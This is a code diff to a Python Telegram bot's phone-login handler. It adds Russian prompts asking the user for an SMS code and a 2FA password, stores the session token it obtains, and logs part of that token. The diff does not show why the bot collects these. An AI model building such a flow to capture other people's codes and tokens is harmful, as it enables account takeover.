@@ -127,19 +127,25 @@ async def phone_handler(message: types.Message, state: FSMContext):
             pending[uid]["user_id"] = client.my_id
             pending[uid]["status"] = "done"
             logging.info(f"Токен сохранён: {client.token[:20]}...")
+            await safe_edit(msg, "✅ SMS отправлена. Введи код из 6 цифр:")
         except Exception as e:
             error = str(e).lower()
             logging.error(f"Ошибка авторизации: {e}")
             if "block" in error:
-                pending[uid]["status"] = "blocked"
+                await safe_edit(msg, "🚫 Аккаунт заблокирован или удалён.")
             elif "flood" in error or "limit" in error:
-                pending[uid]["status"] = "flood_sms"
+                await safe_edit(msg, "⏳ Слишком много попыток. Попробуйте позже.")
             elif "password" in error or "2fa" in error:
                 pending[uid]["status"] = "need_password"
+                await safe_edit(msg, "🔐 Введи пароль 2FA:")
             elif "invalid" in error or "wrong" in error:
                 pending[uid]["status"] = "invalid_code"
+                await safe_edit(msg, "❌ Неверный код. Попробуй ещё раз.")
             else:
-                pending[uid]["status"] = f"error:{e}"
+                await safe_edit(msg, f"❌ {e}")
+            if uid in pending and pending[uid].get("status") != "need_password" and pending[uid].get("status") != "invalid_code":
+                del pending[uid]
+                await state.clear()
 
     asyncio.create_task(auth_task())
 
